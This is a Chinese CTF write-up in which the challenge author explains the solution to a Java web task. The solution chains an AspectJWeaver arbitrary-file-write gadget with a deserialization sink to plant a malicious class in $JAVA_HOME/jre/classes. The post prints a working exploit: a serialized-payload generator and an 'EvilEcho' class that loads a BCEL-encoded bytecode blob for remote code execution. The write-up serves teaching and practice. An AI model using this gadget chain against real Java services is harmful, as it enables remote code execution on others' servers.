---
title: 记一次CTF出题之一写一个不吱声_WP篇
date: 2024-10-01 18:53:00 +0800
img_path: /
categories: [CTF, CTF出题记录]
tags: [CTF, CTF出题记录]  

---



# WEB-一写一个不吱声

## 一、查看题目信息

`clesses`，你也许需要知道$JAVA_HOME?

`F12`可看到一段`base64`编码的提示。

![image-20240603212134745](assets/image-20240603212134745.png)

提示：任意文件写`RCE`，并且"我"创建了一个文件夹，目的要我们实现`RCE`。

![image-20240603212249484](assets/image-20240603212249484.png)



## 二、题目分析

反编译查看`pom.xml`文件，发现一个`Docker`的镜像名，和一个`aspectjweaver`依赖，考察`aspectjweaver`任意文件写的链子，但是没有`CC`依赖。

![image-20240603212539638](assets/image-20240603212539638.png)

很明显的反序列化点：

![image-20240603212724215](assets/image-20240603212724215.png)

可以代替`CC`依赖的类，并且内容都是可控的：

![image-20240603212852838](assets/image-20240603212852838.png)

所以很明显的是考察任意文件写`RCE`，根据前面提示创建了一个文件夹猜测是`$JAVA_HOME/jre/clesses`，那么可以往里面写一个恶意类并且实现`Serializable`重写`readObject`方法，那么就可以通过反序列化点实现任意代码执行。

至于为什么是`$JAVA_HOME/jre/clesses`？

根据类的双亲委派模型，类的加载顺序会先从`Bootstrap ClassLoader`的加载路径中尝试加载，当找不到该类时，才会选择从下一级的`ExtClassLoader`的加载路径寻找，以此类推到引发加载的类所在的类加载器为止。

`sun.boot.class.path`是一个配置变量，通过本地执行:

```java
System.getProperty("sun.boot.class.path")
```

可获取到`Bootstrap ClassLoader`加载类时，文件的读取路径。

```java
C:\Program Files\Java\jdk1.8.0_66\jre\lib\resources.jar;
C:\Program Files\Java\jdk1.8.0_66\jre\lib\rt.jar;
C:\Program Files\Java\jdk1.8.0_66\jre\lib\sunrsasign.jar;
C:\Program Files\Java\jdk1.8.0_66\jre\lib\jsse.jar;
C:\Program Files\Java\jdk1.8.0_66\jre\lib\jce.jar;
C:\Program Files\Java\jdk1.8.0_66\jre\lib\charsets.jar;
C:\Program Files\Java\jdk1.8.0_66\jre\lib\jfr.jar;
C:\Program Files\Java\jdk1.8.0_66\jre\classes
```

可以注意到存在一个`C:\Program Files\Java\jdk1.8.0_66\jre\classes`路径，其实对应的就是`$JAVA_HOME/jre/clesses`，也就是说当我们加载类时会在这个路径下寻找如果存在则可以加载。

`$JAVA_HOME`可根据给的镜像名拉一个看：`/usr/lib/jvm/java-8-openjdk-amd64/jre/`

题目不出网如何回显？还是根据镜像得知`java`版本是小于`JDK8u251`的存在`BCEL`的利用方式，可通过这样来实现回显`RCE`

任意文件写POC：

```java
package org.example.aspectjweaver;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

import static com.polar.ctf.util.Tools.base64Encode;
import static com.polar.ctf.util.Tools.serialize;

public class AspectJWeaverPoc {
    public static void main(String[] args) throws Exception {
        Constructor con = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap").getDeclaredConstructor(String.class, int.class);
        con.setAccessible(true);
        // 实例化对象
        HashMap map = (HashMap) con.newInstance("/usr/lib/jvm/java-8-openjdk-amd64/jre/classes/", 1);     //路径
        Constructor constructor = Class.forName("com.polar.ctf.bean.UserBean").getDeclaredConstructor();
        constructor.setAccessible(true);
        Object userBean = constructor.newInstance();
        Class cls = userBean.getClass();
        Field field = cls.getDeclaredField("obj");
        field.setAccessible(true);
        field.set(userBean, map);
        Field field1 = cls.getDeclaredField("name");
        field1.setAccessible(true);
        field1.set(userBean, "EvilEcho.class"); //恶意类文件名，注意和下方内容的类名一致。
        Field field2 = cls.getDeclaredField("age");
        field2.setAccessible(true);
        String payload = "yv66vgAAADQAdAoABgAtCAxxxxxx"; // 恶意类Base64编码后的内容
        field2.set(userBean, payload);
        byte[] bytes = serialize(userBean);
        System.out.println(base64Encode(bytes));
    }
}
```

恶意类：

```java
import com.sun.org.apache.bcel.internal.util.ClassLoader;

import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.Method;
import java.util.Base64;

public class EvilEcho implements Serializable {
    public static void main(String[] args) {
        try {
            Class<?> evilClass = Class.forName("EvilEcho");
            Object evilInstance = evilClass.getDeclaredConstructor().newInstance();
            ByteArrayOutputStream btout = new ByteArrayOutputStream();
            ObjectOutputStream objOut = new ObjectOutputStream(btout);
            objOut.writeObject(evilInstance);
            System.out.println(new String(Base64.getEncoder().encode(btout.toByteArray())));
            //deserialize(btout.toByteArray());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private void readObject(ObjectInputStream ois) throws Exception {
        String code = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$5bW$TW$U$fe$8e$q$99a$YD$C$I$f1R$c1k$40M$c4$bb$40$ad$IX$ac$B$adA$v$a2m$87$e1$A$D$93$9983$B$b4$f7$7bko$f6fk$ed$cd$da$d6v$f5$c9$97$e8j$97$ae$3e$f7$a1$7d$e9k$9f$fa$d4$be$f4$l$d4$ee$93I4$R$ace$z$f69g_$ce$de$fb$db$7b$9f$cc$cf$ff$fcp$D$c0V$7c$a7$a0$i$87$U$3c$8c$c3$82$qe$M$u8$82$a32$G$r$3c$a2$40$c2$90$84c$K$86q$5c$c6$J$Z$8f$caxL$c6$e324$n$h$91$a1$cb$Y$95$c0$85$c6$98$8cq$Z$T$K$ML$w$a8$c1$94$MS$ac$v$Z$96$M$5bFZ8$3b$v$c3$91$e0$w$f0$90$RdZ$c1$Mf$V4$e2$94$8c$d3b$7dB$90$te$3c$r$e3i$J$cf$uh$c1$b3$S$9ec$Iu$Y$96$e1$edf$u$8b6$le$It$d9$a3$9c$a1$waX$bc$3f$93$g$e1$ce$806b$S$t$9c$b0u$cd$3c$aa9$868$e7$99$Bo$c2p$ZV$tlg$3c$ceg$b5T$da$e4q$cdMs$dd$9b$9c$e1$da4w$e2$7b$bbz$S$3d$fa$84$dd$ce$mw$e8f$de$d9$82$e9M$M$d5$89ImZ$8b$9b$9a5$k$ef25$d7m$X$82V$86$rE$C$87$8f$99t$5d$bc$8f$7b$T$f6hNc$b3$88$e6$b6$c6$c1$91IR$c8I$b6$I$b2U$90m$82l$Xd$87$m$3b$F$d9Uj$97$f4$i$c3$g$t$bb$b2$e9V$8a$a6fx$3eYpZsZ$v$a4$ba$oa$cf$ac$ce$d3$9ea$5b$q$afLz$9a$3e$d5$a7$a5s$88Py$r$3cO$c5$a5$eaI$e8$s$a0$Z$94$a4$9dqt$be$cf$Q$80U$W$e0$88$89$ebTlDL$c2$L$w$5e$c4K$w$5e$c6$x$M$j$Ee$ccM$L$f7c$8e$96$e23$b63$V$9b$e1$p1$dd$b6$3c$3e$eb$c5$i$7e2$c3$5d$_v$d8_$bb$7cv$afm$8er$ea$81WU$bc$863$M$b5$e3$dc$cbktz$94$ccH$c6$e3T$a9$aa$3b$QW$f1$3a$de$60Xt$t$9a$94$85$8a7$f1$W$c3$9e$ff$hO$92$3b$d3$e6$bcN$xr$b1$b8i$dbr$J$C$e5vd$M$cb$85$e3$d9$98$eb$db$de$be$a3$a0$5cN$ca$83$8e$e1qG$c5$db$o$d25$a5$G$T$9e$97$8e$f5$S$v$f5$ee$h$f6r$8d0$v$c9$ce$af$ab$8a$b3x$87$ea$ae$a7F$Z$q$db$8dY$94$98$84wU$bc$87$f7U$7c$80s$q$i$dc$df$af$e2C$7cD$9d$T$d7I$z$3ebXqw$82$8e$hu$V$e7$f11$f1$E$y$9eiQ$x$e7$5cd$3c$c3$8c$tu$cd$b2D$v$$$a8$f8$E$9f$aa$f8$M$9fK$f8B$c5E$7c$v$K$7e$89n8$de$a9$e2$x$7c$ad$e2$h$e1$w8ff$c4$c5A$dd$b4$zJ$baf$9eVSq$Z$df2$ac$bc$f7$a014$dcmzJ$a0$Y$98p$I$ljI$3d$e38$dc$f2$K$e7$dahs$e2N$zj$f4$3a$C4$dfk$b9$ceI$d8$3e$b8$91$S$f5$o$91$b0$99W$40$c51i$93$e3PA$a3s$c7n$ce$8d$ed$7eA$LY$ec$99$c7fx$8eM$f3$7f$bd$o$n$c3$9a$b6$a7$I$ec$5d$d1$b9O$c9$f0$5cV$f3$7c$PN5$c5$d4$cduSs$f8h$n$b6J$97$7b$9d$ba$ce$5d$d7$f0$9f$c8$e81$f1$ae$W$f7$e0$v$d7$e3$v$7f$y$O9v$9a$3b$de$v$86$b5$f7$c0$e1$d6$8bT$e1$d9G$d2d$d4$a5$89$B$v$ad$d6$z$rYL$a7fX$E$f0$d2$e2$8b$bb$s4$t$vf$c4$d2y$7b$f31R$Ue$f5$xQ3$b7$92$ed$85$ce$ce$b1$Og$y$cfH$VF$b8p$a8$x1$cb$b3$c90$c0g9$cdM4$3a$cf$bbZlA$Q$I$b4J$5d$e5$99$M$L$c9$d5$7e$x$9d$f1$c8$92k$84Z$7d$c1$9da$c7$8b$Ed$de$Q$9dW$m$d0W3$$$ef$e6$a6$91$S$_$J$c3$ba$bbc$5d$3c$c2$o$J$8b$fa$9d$8aJQ$e4$k$fa$BG$d3$v$e7$c6hsiV$FQ$8f$c9S4K$edh$c2$G$fa$5d$W$7f$L$c0$c43O4N$a78$ad$8c$d6$60$cbU$b0$x9$f1$s$a2$a1$i3$84V$a2$aa$af$80$cd$d8B$abL$l$Uy$e3$F$df$d3$95$V$A$d3$afaA$We$e1$40$W$c1$D$z$e1P$d9uHY$c8$89$f5$8cv$e5Y$u$7dy$85$K_A$z$u$b4$84$x$f3$db$fe$f5$h$f2$bam$81$8d$b7$b6$c1$bc$ddB$b2$LW$f9$aa$8b$daByn$b5$e0$86$D$c4$j$w$L$d7$q$85H$8aH$UDm$q$e4$d3H$a0p$93$i$91$oAR$z$t$d5$3aRU$7eBM$5by$e8$3aQ$r$bc$f8$g$ea$b3h$IG$b2Xr$k$e1$88$ot$oJ$m$bc4y$ZU$e2$b8$yw$5cN4$Y$vOF$e4$y$ee$L$af$u$f6$i$91$fd$cb$7fD$e3$d054E$94$yVf$b1$ea$wV$87$d7d$b16$8bu$c2$e9$a0o$Z$cdg$S$91$f3$e1$e5$f9$cds$f8$97Q$7e$a0$r$8b$f5$83WD$R$d8$Q$3bN$lJe$b9$S9XF$b4$9c$ca$a3$a0$9e$ca$d0$E$f1$9aWb$t$W$a2$LU$e8$c7$o$M$a1$g6$c28C_hgQ$8bs$a8$c3$r$y$G$e5$8b$hh$c0$_$88$e07$y$c1$eft$d7$lX$8e$3f$b1$C$7f$a3$915$a3$89ub$r$h$c2$g$f2$b8$8a$9d$c0j6$82$b5$b9v8M$7eT$d6$87m$d8N$a7z$b6$X$3b$c8$t$p$8b$9d$d8$856j$a0$$$b6$Y$ed$c4$xC$3f$ab$40$H$f1$C$Y$a2$f0$ef$a7$5d$90$e2$f9$L$bbI$g$a2$a8$7e$c5$D$b4$93$u$a6$y$f6$90T$a6$c8$$$a2$T$7b$v$af$h$b8$40ytC$n$efA$f4$60$ly$7b$90$fe$b7$pp$93$C$ae$90$d0$xa$bf$84$87$K$d4$df$f8$fb$D$S$S$40$c5MB$89$60$93$d0$X$a4$I$fbs$ed$7d$f0_g$f9j$k$Y$L$A$A";
        //new ClassLoader().loadClass(code).newInstance();
        ClassLoader classLoader = (ClassLoader) Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader").getDeclaredConstructor().newInstance();

        // 获取 loadClass 方法
        Method loadClassMethod = classLoader.getClass().getMethod("loadClass", String.class);

        // 调用 loadClass 方法加载类
        Class<?> loadedClass = (Class<?>) loadClassMethod.invoke(classLoader, code);
        loadedClass.newInstance();
    }
}
```

`javac`编译一下即可

## 三、漏洞利用

先写文件

![image-20240603213743991](assets/image-20240603213743991.png)

再反序列化写入的恶意类：

![image-20240603213828453](assets/image-20240603213828453.png)

